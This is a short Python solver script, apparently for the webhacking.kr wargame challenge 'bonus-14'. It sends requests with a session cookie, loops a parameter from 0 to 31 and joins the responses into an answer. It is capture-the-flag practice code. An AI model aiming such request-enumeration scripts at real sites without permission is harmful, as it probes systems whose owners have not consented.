import requests
import time

url = 'http://webhacking.kr/challenge/bonus/bonus-14/index.php'

cookies = {
    'PHPSESSID': ''
}

payloads = {
    'm': ''
}

answer = ''
res = requests.get(url, cookies=cookies)
print(res.text)

time.sleep(10)
for i in range(0, 32):
    payloads['m'] = str(i)
    res = requests.get(url, cookies=cookies, params=payloads)
    print(res.text)
    answer += res.text.rstrip().lstrip()
    
print(answer)